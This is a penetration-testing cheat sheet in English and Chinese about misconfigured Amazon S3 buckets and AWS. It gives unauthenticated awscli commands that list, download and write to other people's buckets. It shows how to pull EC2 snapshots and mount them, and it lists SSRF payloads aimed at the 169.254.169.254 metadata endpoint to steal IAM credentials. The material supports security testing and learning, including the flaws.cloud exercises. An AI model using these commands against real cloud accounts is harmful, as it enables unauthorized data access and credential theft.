# Amazon Bucket S3 AWS - 存储桶

## Summary - 总结

  - [AWS Configuration - AWS配置](#aws-configuration---aws配置)
  - [Open Bucket - 打开存储桶](#open-bucket---打开存储桶)
  - [Basic tests - 基本操作](#basic-tests---基本操作)
    - [Listing files - 列出文件](#listing-files---列出文件)
    - [Move a file into the bucket - 将文件移动到存储桶中](#move-a-file-into-the-bucket---将文件移动到存储桶中)
    - [Download every things - 下载所有存储桶中的内容](#download-every-things---下载所有存储桶中的内容)
    - [Check bucket disk size - 检查存储桶磁盘大小](#check-bucket-disk-size---检查存储桶磁盘大小)
  - [AWS Extract Backup - AWS提取备份](#aws-extract-backup---aws提取备份)
  - [Bucket juicy data - 其他有趣数据](#bucket-juicy-data---其他有趣数据)
  - [References](#references)

## AWS Configuration - AWS配置

> 译者注：亚马逊*AWS*，全称*Amazon Web Services* (*AWS*) ，是亚马逊提供的是全球最全面、应用最广泛的云平台，从全球数据中心提供超过200 项功能齐全的服务。

先决条件，首先你需要安装awscli：

```
sudo apt install awscli
```

可以在此处获取凭证 https://console.aws.amazon.com/iam/home?#/security_credential ，但需要一个aws账户，免费帐户即可 : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/

```
aws configure
AWSAccessKeyId=[ENTER HERE YOUR KEY]
AWSSecretKey=[ENTER HERE YOUR KEY]
aws configure --profile nameofprofile
```

然后您可以在aws命令中使用 *--profile nameofprofile*。

或者，您可以使用环境变量而不是创建配置文件。

```
export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56
export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ
export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=
```

## Open Bucket - 打开存储桶

默认情况下，Amazon存储桶的名称类似于 `http://s3.amazonaws.com/[bucket_name]/`，如果您知道该名称，可以浏览并打开存储桶：

```
http://s3.amazonaws.com/[bucket_name]/
http://[bucket_name].s3.amazonaws.com/
http://flaws.cloud.s3.amazonaws.com/
https://buckets.grayhatwarfare.com/
```

如果启用列表，也会列出名字。

```
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>adobe-REDACTED-REDACTED-REDACTED</Name>
```

或者，您可以使用 `%C0` 提取站点内部 s3 存储桶的名称。 (来源：https://twitter.com/0xmdv/status/1065581916437585920)

```
http://example.com/resources/id%C0

eg: http://redacted/avatar/123%C0
```

## Basic tests - 基本操作

### Listing files - 列出文件

```
aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

您也可以通过 dig 或 nslookup 获取信息。

```
$ dig flaws.cloud
;; ANSWER SECTION:
flaws.cloud.    5    IN    A    52.218.192.11

$ nslookup 52.218.192.11
Non-authoritative answer:
11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.
```

### Move a file into the bucket - 将文件移动到存储桶中

```
aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read
aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers
aws s3 mv test.txt s3://hackerone.marketing
FAIL : "move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied."

aws s3 mv test.txt s3://hackerone.files
SUCCESS : "move: ./test.txt to s3://hackerone.files/test.txt"
```

### Download every things - 下载所有存储桶中的内容

```
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

### Check bucket disk size - 检查存储桶磁盘大小

使用 `--no-sign` 进行非授权检查。

```
aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWriteTime|^$|--)" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024" MB"}'
```

## AWS Extract Backup - AWS提取备份

```
$ aws --profile flaws sts get-caller-identity
"Account": "XXXX26262029",


$ aws --profile profile_name ec2 describe-snapshots
$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
"SnapshotId": "snap-XXXX342abd1bdcb89",

Create a volume using snapshot
$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
In Aws Console -> EC2 -> New Ubuntu
$ chmod 400 YOUR_KEY.pem
$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com

Mount the volume
$ lsblk
$ sudo file -s /dev/xvda1
$ sudo mount /dev/xvda1 /mnt
```

## Bucket juicy data - 其他有趣数据

Amazon 公开了一项内部服务，每个 EC2 实例都可以查询有关主机的实例元数据。如果您发现在 EC2 上存在 SSRF 漏洞，请尝试以下请求：

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
```

一个示例 : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

## References

- [There's a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis](https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets)
- [Bug Bounty Survey - AWS Basic test](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
- [flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws.cloud/)
- [flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws2.cloud/)
- [Guardzilla video camera hardcoded AWS credential ~~- 0dayallday.org~~ - blackmarble.sh](https://blackmarble.sh/guardzilla-video-camera-hard-coded-aws-credentials/)
- [AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-1-s3-buckets/)
- [AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-2-s3-iam-ec2/)
- [A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019](https://blog.cloudsploit.com/a-technical-analysis-of-the-capital-one-hack-a9b43d7c8aea?gi=8bb65b77c2cf)